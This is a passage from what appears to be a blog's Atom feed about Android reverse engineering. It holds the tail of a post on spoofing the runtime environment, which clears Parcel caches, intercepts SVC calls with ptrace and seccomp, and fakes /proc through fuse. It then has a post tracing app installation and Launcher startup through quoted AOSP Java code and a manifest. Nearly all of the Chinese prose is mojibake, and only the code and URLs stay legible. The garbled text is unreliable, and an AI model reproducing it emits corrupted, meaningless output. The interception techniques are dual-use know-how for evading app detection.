ï¼Œå¦‚æœä¸å­˜åœ¨çš„è¯å†é€šè¿‡ipcå»è·å–ã€‚<strong>Apkåœ¨å¯åŠ¨ä¸€ç¬é—´å°±è¿›è¡Œäº†åˆå§‹åŒ–ï¼Œcacheä¼šè¢«ä¿å­˜</strong>ã€‚å¾ˆå¤šIPCä»£ç†äººä¼šè¿™ä¹ˆè®¾è®¡ï¼Œæ‰€ä»¥<strong>éœ€è¦æ¸…ç†æ‰cache</strong>ï¼Œè¿™ä¸ªcacheå¯ä»¥æ˜¯Parcelçš„cacheä¹Ÿå¯ä»¥æ˜¯IPCä»£ç†äººé‡Œé¢çš„cache ã€‚<strong>æ¯”å¦‚Parcelé‡Œé¢çš„mCreators æˆ–è€…sPairedCreators éƒ½éœ€è¦æ¸…ç©º</strong> ã€‚å¦‚æœæ˜¯IPCä»£ç†äººçš„è¯ä¹Ÿå¯ä»¥çœ‹ä»£ç çœ‹å…·ä½“å®ç°ï¼Œçœ‹çœ‹æ˜¯å¦åŒ…å«cacheï¼Œæœ‰çš„è¯æ¸…æ‰å³å¯</p><h4 id="SVCæ‹¦æˆªï¼š"><a href="#SVCæ‹¦æˆªï¼š" class="headerlink" title="SVCæ‹¦æˆªï¼š"></a>SVCæ‹¦æˆªï¼š</h4><p>ä¸»è¦ç”¨çš„æ˜¯ptrace+seccompåšçš„æ¶å­</p><p><a href="https://bbs.kanxue.com/thread-273160.htm">https://bbs.kanxue.com/thread-273160.htm</a></p><h4 id="æ–‡ä»¶è¯»å–ï¼š"><a href="#æ–‡ä»¶è¯»å–ï¼š" class="headerlink" title="æ–‡ä»¶è¯»å–ï¼š"></a>æ–‡ä»¶è¯»å–ï¼š</h4><p>è¿™å—åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œ<code>proc</code>ä¸‹çš„æ–‡ä»¶æˆ‘ä¼šä½¿ç”¨<code>fuse</code> å¯¹æ•´ä¸ª<code>proc</code>è¿›è¡Œæ¨¡æ‹Ÿ ï¼Œè¿™æ˜¯å®Œç¾æ–¹æ¡ˆ ã€‚<code>proot</code>ä»£ç å†™å¥½ç°æˆçš„ï¼Œè¿ç§»åˆ°android ä¸Šç›´æ¥ç”¨å°±å¥½äº†ã€‚</p><p>å¦‚æœæ˜¯è¯»å–ç³»ç»Ÿæ–‡ä»¶çš„è¯ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ IOé‡å®šå‘é…åˆSVCæ‹¦æˆªå³å¯ï¼ŒSVCéƒ½å¯ä»¥æ‹¦æˆªäº†ï¼Œä»»ä½•æ–‡ä»¶è¯»å–ä½ éƒ½å¯ä»¥éšä¾¿ä¿®æ”¹ ã€‚ </p><p><strong>å› ä¸ºä¸ç®¡å¦‚ä½•ï¼Œæœ€ç»ˆéƒ½ä¼šè°ƒç”¨åˆ°ç³»ç»Ÿå†…æ ¸å»è¯»å–æ–‡ä»¶ï¼Œéƒ½ä¼šè¢«è½¬æ¢æˆSVCæŒ‡ä»¤ ã€‚</strong></p><p>ç¬¬å››ç¯‡ï¼š<a href="https://bbs.kanxue.com/thread-281889-1.htm">https://bbs.kanxue.com/thread-281889-1.htm</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;æœ¬æ–‡å‡ ä¹éƒ½æ˜¯æ¥è‡ªäº&lt;strong&gt;çæƒœanyå¤§ä½¬&lt;/strong&gt;çš„æ–‡ç« ï¼Œä¸»è¦æ˜¯ä½œä¸ºå°ç™½çš„å­¦ä¹ è®°å½•&lt;/p&gt;
&lt;p&gt;åŸæ–‡ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a</summary>
      
    
    
    
    <category term="å®‰å“é€†å‘" scheme="http://s1nec-1o.github.io/categories/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"/>
    
    
    <category term="android" scheme="http://s1nec-1o.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>Androidé€†å‘ä»å…¥é—¨åˆ°å…¥åœŸ(1)</title>
    <link href="http://s1nec-1o.github.io/2025/10/11/Android%E9%80%86%E5%90%91%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-1/"/>
    <id>http://s1nec-1o.github.io/2025/10/11/Android%E9%80%86%E5%90%91%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-1/</id>
    <published>2025-10-11T06:38:08.000Z</published>
    <updated>2025-10-11T07:45:29.720Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åªåšå­¦ä¹ è®°å½•çš„å¤‡ä»½ï¼Œæ¥è‡ªäº</p><p><a href="https://bbs.kanxue.com/thread-273293.htm">[åŸåˆ›]Androidæ¼æ´ä¹‹æˆ˜ï¼ˆ11ï¼‰â€”â€”æ•´ä½“åŠ å£³åŸç†å’Œè„±å£³æŠ€å·§è¯¦è§£</a> </p><p><a href="https://www.52pojie.cn/home.php?mod=space&uid=1109458">ã€Šå®‰å“é€†å‘è¿™æ¡£äº‹ã€‹</a></p><h2 id="Android-Appå¯åŠ¨æµç¨‹"><a href="#Android-Appå¯åŠ¨æµç¨‹" class="headerlink" title="Android Appå¯åŠ¨æµç¨‹"></a>Android Appå¯åŠ¨æµç¨‹</h2><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544534.png" alt="image-20250928213056553" style="zoom:50%;" /><p><code>Zygote</code>è¿›ç¨‹forkçš„ç¬¬ä¸€ä¸ªè¿›ç¨‹æ˜¯ï¼š<code>SystemServer</code>è¿›ç¨‹ï¼Œ<code>SystemServer</code>è¿›ç¨‹ä¸»è¦è¿›è¡Œä»¥ä¸‹çš„å·¥ä½œ</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544536.png" alt="image-20250928213032187"  /><h3 id="Android-APPå®‰è£…"><a href="#Android-APPå®‰è£…" class="headerlink" title="Android APPå®‰è£…"></a>Android APPå®‰è£…</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Â· ç³»ç»Ÿå¯åŠ¨æ—¶å®‰è£…ï¼Œæ²¡æœ‰å®‰è£…ç•Œé¢</span><br><span class="line">Â· ç¬¬ä¸‰æ–¹åº”ç”¨å®‰è£…ï¼Œæœ‰å®‰è£…ç•Œé¢ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬æœ€ç†Ÿæ‚‰çš„æ–¹å¼</span><br><span class="line">Â· ADBå‘½ä»¤å®‰è£…ï¼Œæ²¡æœ‰å®‰è£…ç•Œé¢</span><br><span class="line">Â· é€šè¿‡å„ç±»åº”ç”¨å¸‚åœºå®‰è£…ï¼Œæ²¡æœ‰å®‰è£…ç•Œé¢</span><br></pre></td></tr></table></figure><p>æœ‰è¿™å››ç§å®‰è£…æ¨¡å¼</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544537.png" alt="image-20250928215538686"></p><p>ä½†æ˜¯éƒ½æ˜¯é€šè¿‡<code>PackgeManagerService</code>æœåŠ¡æ¥å®Œæˆåº”ç”¨ç¨‹åºçš„å®‰è£…çš„ï¼Œè€Œ<code>PackgeManagerService</code>æœåŠ¡ä¼šä¸<code>installed</code>æœåŠ¡é€šä¿¡ï¼Œå‘é€å…·ä½“çš„æŒ‡ä»¤æ¥æ‰§è¡Œåº”ç”¨ç¨‹åºçš„å®‰è£…ã€å¸è½½ç­‰å·¥ä½œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> IPackageManager <span class="title function_">main</span><span class="params">(Context context, Installer installer,</span></span><br><span class="line"><span class="params">    <span class="type">boolean</span> factoryTest, <span class="type">boolean</span> onlyCore)</span> &#123;</span><br><span class="line">        <span class="type">PackageManagerService</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PackageManagerService</span>(context, installer, factoryTest, onlyCore);</span><br><span class="line">        ServiceManager.addService(<span class="string">&quot;package&quot;</span>, m);</span><br><span class="line">    <span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œçš„<code>PackgeManagerService</code>å…¶å®å°±æ˜¯ä¸Šè¿°çš„<code>PackageManager</code>æœåŠ¡æ³¨å†Œçš„</p></blockquote><p><code>IPackageManager</code>å‡½æ•°æ˜¯Androidç³»ç»Ÿä¸­åŒ…ç®¡ç†æœåŠ¡çš„åˆå§‹åŒ–å…¥å£ï¼Œåˆå§‹åŒ–<code>PackageManagerService</code>ï¼Œå°†æœåŠ¡åŠ å…¥åˆ°ç³»ç»ŸæœåŠ¡ç®¡ç†å™¨ä¸­ï¼Œç„¶åè¿”å›<code>PackgeManagerService</code>çš„å®ä¾‹ä¾›ç”¨æˆ·ä½¿ç”¨</p><p>åº”ç”¨ç¨‹åºåœ¨å®‰è£…æ—¶æ¶‰åŠåˆ°å¦‚ä¸‹å‡ ä¸ªé‡è¦ç›®å½•ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544538.png" alt="image-20250928220334806"></p><p>Appçš„å®‰è£…æµç¨‹æ˜¯ç”±<code>PackageManagerService</code>å®Œæˆçš„ï¼Œæ­¤å‰<code>SystemServer</code>å°±å·²ç»å¯åŠ¨äº†ä¸€ä¸ªæ›´é‡è¦çš„æœåŠ¡<code>ActivityManagerService</code>ï¼Œ<code>ActivityManagerService</code>å…¶ä¸­ä¸€ä¸ªé‡è¦çš„ä½œç”¨å°±æ˜¯åœ¨å¯åŠ¨å®Œ<code>PackageManagerService</code>ä¹‹åå°†<code>Launcher</code>è¿›ç¨‹å¯åŠ¨èµ·æ¥</p><h4 id="Launcherå¯åŠ¨æµç¨‹"><a href="#Launcherå¯åŠ¨æµç¨‹" class="headerlink" title="Launcherå¯åŠ¨æµç¨‹"></a><a href="https://blog.csdn.net/itachi85/article/details/56669808">Launcher</a>å¯åŠ¨æµç¨‹</h4><p>å¯åŠ¨<code>Launcher</code>çš„å…¥å£ä¸º<code>ActivityManagerService</code>çš„<code>systemReady</code>å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">startOtherServices</span><span class="params">()</span> &#123;</span><br><span class="line">...</span><br><span class="line">mActivityManagerService.systemReady(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            Slog.i(TAG, <span class="string">&quot;Making services ready&quot;</span>);</span><br><span class="line">            mSystemServiceManager.startBootPhase(</span><br><span class="line">                    SystemService.PHASE_ACTIVITY_MANAGER_READY);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>startOtherServices</code>å‡½æ•°ä¸­ï¼Œä¼šè°ƒç”¨<code>ActivityManagerService</code>çš„<code>systemReady</code>å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">systemReady</span><span class="params">(<span class="keyword">final</span> Runnable goingCallback)</span> &#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">       ...</span><br><span class="line">        mStackSupervisor.resumeFocusedStackTopActivityLocked();</span><br><span class="line">        mUserController.sendUserSwitchBroadcastsLocked(-<span class="number">1</span>, currentUserId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>systemReady</code>å‡½æ•°ä¸­è°ƒç”¨äº†<code>ActivityStackSupervisor</code>çš„<code>resumeFocusedStackTopActivityLocked</code>å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">resumeFocusedStackTopActivityLocked</span><span class="params">(</span></span><br><span class="line"><span class="params">        ActivityStack targetStack, ActivityRecord target, ActivityOptions targetOptions)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (targetStack != <span class="literal">null</span> &amp;&amp; isFocusedStack(targetStack)) &#123;</span><br><span class="line">        <span class="keyword">return</span> targetStack.resumeTopActivityUncheckedLocked(target, targetOptions); <span class="comment">//1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ActivityRecord</span> <span class="variable">r</span> <span class="operator">=</span> mFocusedStack.topRunningActivityLocked();</span><br><span class="line">    <span class="keyword">if</span> (r == <span class="literal">null</span> || r.state != RESUMED) &#123;</span><br><span class="line">        mFocusedStack.resumeTopActivityUncheckedLocked(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æ³¨é‡Š1å¤„ä¼šè°ƒç”¨<code>ActivityStack</code>çš„<code>resumeTopActivityUncheckedLocked</code>å‡½æ•°ï¼Œ<code>ActivityStack</code>å¯¹è±¡æ˜¯ç”¨æ¥æè¿°<code>Activity</code>å †æ ˆçš„ï¼Œ<code>resumeTopActivityUncheckedLocked</code>å‡½æ•°å¦‚ä¸‹æ‰€ç¤ºã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">resumeTopActivityUncheckedLocked</span><span class="params">(ActivityRecord prev, ActivityOptions options)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mStackSupervisor.inResumeTopActivity) &#123;</span><br><span class="line">        <span class="comment">// Don&#x27;t even start recursing.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// Protect against recursion.</span></span><br><span class="line">        mStackSupervisor.inResumeTopActivity = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (mService.mLockScreenShown == ActivityManagerService.LOCK_SCREEN_LEAVING) &#123;</span><br><span class="line">            mService.mLockScreenShown = ActivityManagerService.LOCK_SCREEN_HIDDEN;</span><br><span class="line">            mService.updateSleepIfNeededLocked();</span><br><span class="line">        &#125;</span><br><span class="line">        result = resumeTopActivityInnerLocked(prev, options);<span class="comment">//1</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        mStackSupervisor.inResumeTopActivity = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è°ƒç”¨äº†<code>resumeTopActivityInnerLocked</code>å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">resumeTopActivityInnerLocked</span><span class="params">(ActivityRecord prev, ActivityOptions options)</span> &#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> isOnHomeDisplay() &amp;&amp;</span><br><span class="line">                    mStackSupervisor.resumeHomeStackTask(returnTaskType, prev, <span class="string">&quot;prevFinished&quot;</span>);</span><br><span class="line">...                 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨<code>ActivityStackSupervisor</code>çš„<code>resumeHomeStackTask</code>å‡½æ•°ï¼Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">resumeHomeStackTask</span><span class="params">(<span class="type">int</span> homeStackTaskType, ActivityRecord prev, String reason)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (r != <span class="literal">null</span> &amp;&amp; !r.finishing) &#123;</span><br><span class="line">        mService.setFocusedActivityLocked(r, myReason);</span><br><span class="line">        <span class="keyword">return</span> resumeFocusedStackTopActivityLocked(mHomeStack, prev, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mService.startHomeActivityLocked(mCurrentUser, myReason);<span class="comment">//1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨äº†<code>ActivityManagerService</code>çš„<code>startHomeActivityLocked</code>å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">startHomeActivityLocked</span><span class="params">(<span class="type">int</span> userId, String reason)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mFactoryTest == FactoryTest.FACTORY_TEST_LOW_LEVEL</span><br><span class="line">            &amp;&amp; mTopAction == <span class="literal">null</span>) &#123;<span class="comment">//1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getHomeIntent();<span class="comment">//2</span></span><br><span class="line">    <span class="type">ActivityInfo</span> <span class="variable">aInfo</span> <span class="operator">=</span> resolveActivityInfo(intent, STOCK_PM_FLAGS, userId);</span><br><span class="line">    <span class="keyword">if</span> (aInfo != <span class="literal">null</span>) &#123;</span><br><span class="line">        intent.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(aInfo.applicationInfo.packageName, aInfo.name));</span><br><span class="line">        aInfo = <span class="keyword">new</span> <span class="title class_">ActivityInfo</span>(aInfo);</span><br><span class="line">        aInfo.applicationInfo = getAppInfoForUser(aInfo.applicationInfo, userId);</span><br><span class="line">        <span class="type">ProcessRecord</span> <span class="variable">app</span> <span class="operator">=</span> getProcessRecordLocked(aInfo.processName,</span><br><span class="line">                aInfo.applicationInfo.uid, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (app == <span class="literal">null</span> || app.instrumentationClass == <span class="literal">null</span>) &#123;<span class="comment">//3</span></span><br><span class="line">            intent.setFlags(intent.getFlags() | Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">            mActivityStarter.startHomeActivityLocked(intent, aInfo, reason);<span class="comment">//4</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Slog.wtf(TAG, <span class="string">&quot;No home screen found for &quot;</span> + intent, <span class="keyword">new</span> <span class="title class_">Throwable</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨é‡Š1å¤„çš„<code>mFactoryTest</code>ä»£è¡¨<strong>ç³»ç»Ÿçš„è¿è¡Œæ¨¡å¼</strong>ï¼Œç³»ç»Ÿçš„è¿è¡Œæ¨¡å¼åˆ†ä¸ºä¸‰ç§ï¼Œåˆ†åˆ«æ˜¯<strong>éå·¥å‚æ¨¡å¼ã€ä½çº§å·¥å‚æ¨¡å¼å’Œé«˜çº§å·¥å‚æ¨¡å¼</strong>ï¼Œ<code>mTopAction</code>åˆ™ç”¨æ¥æè¿°<strong>ç¬¬ä¸€ä¸ª</strong>è¢«å¯åŠ¨Activityç»„ä»¶çš„<code>Action</code>ï¼Œå®ƒçš„å€¼ä¸º<code>Intent.ACTION_MAIN</code>ã€‚</p><p>å› æ­¤æ³¨é‡Š1çš„ä»£ç æ„æ€å°±æ˜¯<code>mFactoryTest</code>ä¸º<code>FactoryTest.FACTORY_TEST_LOW_LEVEL</code>ï¼ˆä½çº§å·¥å‚æ¨¡å¼ï¼‰å¹¶ä¸”<code>mTopAction=null</code>æ—¶ï¼Œç›´æ¥è¿”å›falseã€‚æ³¨é‡Š2å¤„çš„<code>getHomeIntent</code>å‡½æ•°å¦‚ä¸‹æ‰€ç¤ºã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Intent <span class="title function_">getHomeIntent</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(mTopAction, mTopData != <span class="literal">null</span> ? Uri.parse(mTopData) : <span class="literal">null</span>);</span><br><span class="line">    intent.setComponent(mTopComponent);</span><br><span class="line">    intent.addFlags(Intent.FLAG_DEBUG_TRIAGED_MISSING);</span><br><span class="line">    <span class="keyword">if</span> (mFactoryTest != FactoryTest.FACTORY_TEST_LOW_LEVEL) &#123;</span><br><span class="line">        intent.addCategory(Intent.CATEGORY_HOME);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> intent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getHomeIntent</code>å‡½æ•°ä¸­åˆ›å»ºäº†<code>Intent</code>ï¼Œå¹¶å°†<code>mTopAction</code>å’Œ<code>mTopData</code>ä¼ å…¥ã€‚<code>mTopAction</code>çš„å€¼ä¸º<code>Intent.ACTION_MAIN</code>ï¼Œå¹¶ä¸”å¦‚æœç³»ç»Ÿè¿è¡Œæ¨¡å¼ä¸æ˜¯ä½çº§å·¥å‚æ¨¡å¼åˆ™å°†<code>intent</code>çš„<code>Category</code>è®¾ç½®ä¸º<code>Intent.CATEGORY_HOME</code></p><p>æˆ‘ä»¬å†å›åˆ°<code>ActivityManagerService</code>çš„<code>startHomeActivityLocked</code>å‡½æ•°</p><p>å‡è®¾ç³»ç»Ÿçš„è¿è¡Œæ¨¡å¼ä¸æ˜¯ä½çº§å·¥å‚æ¨¡å¼ï¼Œåœ¨æ³¨é‡Š3å¤„åˆ¤æ–­ç¬¦åˆ<code>Action</code>ä¸º<code>Intent.ACTION_MAIN</code>ï¼Œ<code>Category</code>ä¸º<code>Intent.CATEGORY_HOME</code>çš„åº”ç”¨ç¨‹åºæ˜¯å¦å·²ç»å¯åŠ¨ï¼Œå¦‚æœæ²¡å¯åŠ¨åˆ™è°ƒç”¨æ³¨é‡Š4çš„æ–¹æ³•å¯åŠ¨è¯¥åº”ç”¨ç¨‹åºã€‚</p><p>è¿™ä¸ªè¢«å¯åŠ¨çš„åº”ç”¨ç¨‹åºå°±æ˜¯<code>Launcher</code>ï¼Œå› ä¸º<code>Launcher</code>çš„<code>Manifest</code>æ–‡ä»¶ä¸­çš„<code>intent-filter</code>æ ‡ç­¾åŒ¹é…äº†<code>Action</code>ä¸º<code>Intent.ACTION_MAIN</code>ï¼Œ<code>Category</code>ä¸º<code>Intent.CATEGORY_HOME</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.android.launcher3&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;23&quot;</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;16&quot;</span>/&gt;</span></span><br><span class="line"> ...</span><br><span class="line"> <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">...</span></span></span><br><span class="line"><span class="tag">        &lt;<span class="attr">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;com.android.launcher3.Launcher&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:launchMode</span>=<span class="string">&quot;singleTask&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:clearTaskOnLaunch</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:stateNotNeeded</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:windowSoftInputMode</span>=<span class="string">&quot;adjustPan&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:screenOrientation</span>=<span class="string">&quot;nosensor&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:configChanges</span>=<span class="string">&quot;keyboard|keyboardHidden|navigation&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:resumeWhilePausing</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:taskAffinity</span>=<span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.HOME&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.MONKEY&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">...</span><br><span class="line">  <span class="tag">&lt;/<span class="name">application</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span>         